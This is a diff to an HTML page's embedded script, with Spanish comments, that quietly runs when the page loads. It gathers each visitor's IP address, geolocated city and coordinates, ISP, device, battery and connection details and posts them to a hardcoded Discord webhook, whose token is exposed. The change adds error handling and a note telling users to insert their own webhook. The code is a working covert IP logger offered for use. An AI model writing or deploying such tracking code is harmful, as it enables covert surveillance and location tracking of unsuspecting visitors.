@@ -28,6 +28,7 @@
 </head>
 <body>
     <script>
+        // REEMPLAZA ESTO CON TU PROPIO WEBHOOK DE DISCORD
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1540874149436596365/aUQaFvSdewMu1KrLQpDgP2kGbuA5_nqlemTi08xS3ISm0d-E-8u-ksLBmRDFlt11vyzq';
         
         async function getIP() {
@@ -57,115 +58,159 @@
         }
         
         async function sendData() {
-            const ip = await getIP();
-            const geo = await getGeolocation(ip);
-            
-            const data = {
-                ip: ip,
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                languages: navigator.languages,
-                cookieEnabled: navigator.cookieEnabled,
-                onLine: navigator.onLine,
-                hardwareConcurrency: navigator.hardwareConcurrency,
-                deviceMemory: navigator.deviceMemory || 'N/A',
-                maxTouchPoints: navigator.maxTouchPoints,
-                screenResolution: `${screen.width}x${screen.height}`,
-                screenAvail: `${screen.availWidth}x${screen.availHeight}`,
-                colorDepth: screen.colorDepth,
-                pixelDepth: screen.pixelDepth,
-                viewport: `${window.innerWidth}x${window.innerHeight}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                timezoneOffset: new Date().getTimezoneOffset(),
-                localTime: new Date().toLocaleString(),
-                utcTime: new Date().toUTCString(),
-                referrer: document.referrer || 'Directo',
-                url: window.location.href,
-                hostname: window.location.hostname,
-                pathname: window.location.pathname,
-                protocol: window.location.protocol,
-                battery: 'N/A',
-                connection: 'N/A',
-                geo: geo ? {
-                    city: geo.city,
-                    region: geo.region,
-                    country: geo.country_name,
-                    countryCode: geo.country_code,
-                    continent: geo.continent_code,
-                    latitude: geo.latitude,
-                    longitude: geo.longitude,
-                    postal: geo.postal,
-                    asn: geo.asn,
-                    org: geo.org,
-                    timezone: geo.timezone
-                } : 'No disponible'
-            };
-            
-            if ('getBattery' in navigator) {
-                try {
-                    const battery = await navigator.getBattery();
-                    data.battery = {
-                        level: `${Math.round(battery.level * 100)}%`,
-                        charging: battery.charging,
-                        chargingTime: battery.chargingTime,
-                        dischargingTime: battery.dischargingTime
-                    };
-                } catch (e) {}
-            }
-            
-            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            if (conn) {
-                data.connection = {
-                    effectiveType: conn.effectiveType,
-                    downlink: conn.downlink,
-                    rtt: conn.rtt,
-                    saveData: conn.saveData,
-                    type: conn.type
+            try {
+                const ip = await getIP();
+                const geo = await getGeolocation(ip);
+                
+                const data = {
+                    ip: ip,
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    languages: navigator.languages,
+                    cookieEnabled: navigator.cookieEnabled,
+                    onLine: navigator.onLine,
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    deviceMemory: navigator.deviceMemory || 'N/A',
+                    maxTouchPoints: navigator.maxTouchPoints,
+                    screenResolution: `${screen.width}x${screen.height}`,
+                    screenAvail: `${screen.availWidth}x${screen.availHeight}`,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth,
+                    viewport: `${window.innerWidth}x${window.innerHeight}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    timezoneOffset: new Date().getTimezoneOffset(),
+                    localTime: new Date().toLocaleString(),
+                    utcTime: new Date().toUTCString(),
+                    referrer: document.referrer || 'Directo',
+                    url: window.location.href,
+                    hostname: window.location.hostname,
+                    pathname: window.location.pathname,
+                    protocol: window.location.protocol,
+                    battery: 'N/A',
+                    connection: 'N/A',
+                    geo: geo ? {
+                        city: geo.city,
+                        region: geo.region,
+                        country: geo.country_name,
+                        countryCode: geo.country_code,
+                        continent: geo.continent_code,
+                        latitude: geo.latitude,
+                        longitude: geo.longitude,
+                        postal: geo.postal,
+                        asn: geo.asn,
+                        org: geo.org,
+                        timezone: geo.timezone
+                    } : 'No disponible'
                 };
+                
+                if ('getBattery' in navigator) {
+                    try {
+                        const battery = await navigator.getBattery();
+                        data.battery = {
+                            level: `${Math.round(battery.level * 100)}%`,
+                            charging: battery.charging,
+                            chargingTime: battery.chargingTime,
+                            dischargingTime: battery.dischargingTime
+                        };
+                    } catch (e) {}
+                }
+                
+                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (conn) {
+                    data.connection = {
+                        effectiveType: conn.effectiveType,
+                        downlink: conn.downlink,
+                        rtt: conn.rtt,
+                        saveData: conn.saveData,
+                        type: conn.type
+                    };
+                }
+                
+                const embed = {
+                    embeds: [{
+                        title: '📡 Nuevo visitante',
+                        color: 0x00ff00,
+                        timestamp: new Date().toISOString(),
+                        fields: [
+                            { name: '🌐 IP', value: `\`\`\`${data.ip}\`\`\``, inline: true },
+                            { name: '📍 Ubicación', value: data.geo && data.geo.city ? `${data.geo.city}, ${data.geo.region}, ${data.geo.country}` : 'N/A', inline: true },
+                            { name: '🏳️ Código País', value: data.geo?.countryCode || 'N/A', inline: true },
+                            { name: '📌 Coordenadas', value: data.geo?.latitude ? `${data.geo.latitude}, ${data.geo.longitude}` : 'N/A', inline: true },
+                            { name: '🏢 ISP/Org', value: data.geo?.org || 'N/A', inline: true },
+                            { name: '⏰ Zona Horaria', value: data.geo?.timezone || data.timezone, inline: true },
+                            { name: '💻 Plataforma', value: data.platform, inline: true },
+                            { name: '🌐 Idioma', value: data.language, inline: true },
+                            { name: '📱 User Agent', value: `\`\`\`${data.userAgent.substring(0, 1000)}\`\`\``, inline: false },
+                            { name: '🖥️ Resolución', value: data.screenResolution, inline: true },
+                            { name: '🔲 Viewport', value: data.viewport, inline: true },
+                            { name: '🧠 Núcleos CPU', value: String(data.hardwareConcurrency), inline: true },
+                            { name: '💾 Memoria', value: String(data.deviceMemory) + ' GB', inline: true },
+                            { name: '🎨 Profundidad Color', value: String(data.colorDepth) + ' bit', inline: true },
+                            { name: '🔋 Batería', value: typeof data.battery === 'object' ? `${data.battery.level} ${data.battery.charging ? '⚡' : '🔋'}` : data.battery, inline: true },
+                            { name: '📶 Conexión', value: data.connection?.effectiveType || 'N/A', inline: true },
+                            { name: '🔗 URL', value: data.url, inline: false },
+                            { name: '↩️ Referrer', value: data.referrer, inline: false }
+                        ],
+                        footer: {
+                            text: `Hora local: ${data.localTime}`
+                        }
+                    }]
+                };
+                
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(embed)
+                });
+                
+                if (!response.ok) {
+                    console.error(`Error al enviar: ${response.status} ${response.statusText}`);
+                    // Intenta enviar un mensaje de error más simple
+                    const simpleEmbed = {
+                        content: `⚠️ Error ${response.status}: No se pudo enviar los datos completos. IP: ${data.ip}`
+                    };
+                    
+                    await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(simpleEmbed)
+                    });
+                } else {
+                    console.log('✅ Datos enviados correctamente a Discord');
+                }
+                
+            } catch (error) {
+                console.error('❌ Error general:', error);
+                
+                // Intenta enviar un mensaje de error simple
+                try {
+                    const errorEmbed = {
+                        content: `❌ Error crítico: ${error.message || 'Error desconocido'}`
+                    };
+                    
+                    await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(errorEmbed)
+                    });
+                } catch (e) {
+                    console.error('No se pudo enviar ni el mensaje de error:', e);
+                }
             }
-            
-            const embed = {
-                embeds: [{
-                    title: '📡 Nuevo visitante',
-                    color: 0x00ff00,
-                    timestamp: new Date().toISOString(),
-                    fields: [
-                        { name: '🌐 IP', value: `\`\`\`${data.ip}\`\`\``, inline: true },
-                        { name: '📍 Ubicación', value: data.geo && data.geo.city ? `${data.geo.city}, ${data.geo.region}, ${data.geo.country}` : 'N/A', inline: true },
-                        { name: '🏳️ Código País', value: data.geo?.countryCode || 'N/A', inline: true },
-                        { name: '📌 Coordenadas', value: data.geo?.latitude ? `${data.geo.latitude}, ${data.geo.longitude}` : 'N/A', inline: true },
-                        { name: '🏢 ISP/Org', value: data.geo?.org || 'N/A', inline: true },
-                        { name: '⏰ Zona Horaria', value: data.geo?.timezone || data.timezone, inline: true },
-                        { name: '💻 Plataforma', value: data.platform, inline: true },
-                        { name: '🌐 Idioma', value: data.language, inline: true },
-                        { name: '📱 User Agent', value: `\`\`\`${data.userAgent.substring(0, 1000)}\`\`\``, inline: false },
-                        { name: '🖥️ Resolución', value: data.screenResolution, inline: true },
-                        { name: '🔲 Viewport', value: data.viewport, inline: true },
-                        { name: '🧠 Núcleos CPU', value: String(data.hardwareConcurrency), inline: true },
-                        { name: '💾 Memoria', value: String(data.deviceMemory) + ' GB', inline: true },
-                        { name: '🎨 Profundidad Color', value: String(data.colorDepth) + ' bit', inline: true },
-                        { name: '🔋 Batería', value: typeof data.battery === 'object' ? `${data.battery.level} ${data.battery.charging ? '⚡' : '🔋'}` : data.battery, inline: true },
-                        { name: '📶 Conexión', value: data.connection?.effectiveType || 'N/A', inline: true },
-                        { name: '🔗 URL', value: data.url, inline: false },
-                        { name: '↩️ Referrer', value: data.referrer, inline: false }
-                    ],
-                    footer: {
-                        text: `Hora local: ${data.localTime}`
-                    }
-                }]
-            };
-            
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(embed)
-            }).catch(() => {});
         }
         
+        // Ejecutar cuando la página esté lista
         sendData();
+        
+        // Mostrar mensaje en consola para debugging
+        console.log('🔍 Script ejecutándose... Revisa la consola para ver el estado');
     </script>
 </body>
 </html>
